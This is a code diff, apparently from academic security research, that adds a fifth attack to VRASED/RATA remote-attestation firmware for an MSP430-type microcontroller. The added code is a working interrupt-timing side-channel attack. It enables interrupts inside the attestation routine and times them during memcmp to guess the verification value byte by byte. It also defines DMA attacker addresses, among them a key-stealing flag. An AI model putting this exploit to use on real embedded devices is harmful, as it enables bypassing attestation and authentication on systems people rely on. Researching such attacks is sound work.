@@ -20,9 +20,9 @@ hmac(
   uint32_t datalen
 );
 
-#if __ATTACK == 4
+#if __ATTACK == 4 || __ATTACK == 5
 
-int attack_iteration = 0;
+int attack_iteration;
 
 // VRASED_A: authenticated attestation
 // we based the code on the RATA implementation, which only differs from the code
@@ -108,7 +108,7 @@ __attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMA
 
 #define DMA_ATTACKER_STEAL_KEY          0x0070
 #define DMA_ATTACKER_PERSISTENT_FLAG    0x0072
-#define DMA_ATTACKER_MEASURE            0x0074
+#define DMA_ATTACKER_RESET_CNT          0x0074
 #define DMA_ATTACKER_ACTIVE             0x0076
 
 #define KEY_SIZE                        64
@@ -171,6 +171,60 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
       TACTL = TACLR | MC_2 | TASSEL_2;
     #endif
 
+    #if __ATTACK == 5
+      attack5:
+      // modifying the counter address for demonstration purposes; normally this
+      // would also be protected (but its value is known to the attacker)
+      my_memset(CTR_ADDR, 32, 0);
+
+      my_memset(VRF_AUTH, 32, 0);
+
+      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
+        uint16_t delay = *((uint16_t*) DMA_ATTACKER_RESET_CNT);
+        printf("Interrupt delay: %u\n", delay);
+
+        // in case the delay is 14486, it means the interrupt was served in one
+        // cycle: it hit the `mov.b` instruction (pc: b0b6) that is already
+        // outside of the comparison loop in `memcmp`.
+        // in case the delay is one cycle longer, that indicates interrupting
+        // during the `jmp` instruction (pc: b0be) that jumps back to the start
+        // of the comparison loop in `memcmp`, indicating that the first byte
+        // was correctly guessed
+
+        if (delay == 14486) {
+          attack_iteration++;
+          printf("First byte not guessed, retrying\n");
+        } else {
+          printf("First byte guessed, finishing\n");
+          return;
+        }
+      } else {
+        printf("First run\n");
+      }
+
+      uint8_t * verification = (uint8_t*) VRF_AUTH;
+      // correct verification value: 444eb44a4a018344b057451667ac6e8414f7736c329edd7fff8d467cb1f5c5d3
+      switch (attack_iteration) {
+      case 0:
+        verification[0] = 0x42;
+        verification[1] = 0x42;
+        break;
+      case 1:
+        verification[0] = 0x44;
+        verification[1] = 0x42;
+        break;
+      case 2:
+        verification[0] = 0x44;
+        verification[1] = 0x4e;
+        break;
+      }
+
+      // setting up the clock for interrupting
+      TACCR0 = 26385;
+      *((uint16_t*) DMA_ATTACKER_RESET_CNT) = 0;
+      TACTL = TACLR | MC_1 | TASSEL_2 | ID_3 | TAIE;
+    #endif
+
     #if __ATTACK == 1
       leak_key((uint8_t*) KEY_ADDR, 31, 64);
       return;
@@ -206,8 +260,13 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     //Copy input challenge to MAC_ADDR:
     my_memcpy ( (uint8_t*)MAC_ADDR, challenge, 32);
 
+    #if __ATTACK == 5
+    // enable interrupts
+    __eint();
+    #else
     //Disable interrupts:
     __dint();
+    #endif
 
     // Save current value of r5 and r6:
     __asm__ volatile("push    r5" "\n\t");
